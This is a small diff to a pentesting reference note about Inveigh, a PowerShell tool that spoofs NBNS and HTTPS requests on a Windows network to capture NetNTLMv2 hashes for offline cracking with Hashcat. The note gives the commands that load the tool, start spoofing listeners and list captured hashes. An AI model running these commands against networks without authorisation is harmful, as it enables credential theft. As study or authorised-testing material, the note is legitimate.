@@ -1,7 +1,7 @@
 Inveigh is a very useful tool for intercepting and spoofing requests for domain resources. It requests authentication for network access and records the NetNTLMv2 hashes to be cracked offline with [[Hashcat]].
 
 ```powershell
-Import-Module Inveigh.ps1 # Imports the 
+Import-Module Inveigh.ps1 # Imports the Inveigh Powershell Module
 Invoke-Inveigh -NBNS -HTTPS -IP <Local IP> -ConsoleOutput # Default listeners
 Get-Inveigh # View all captured hashes
 Clear-Inveigh # Clear all captured hashes
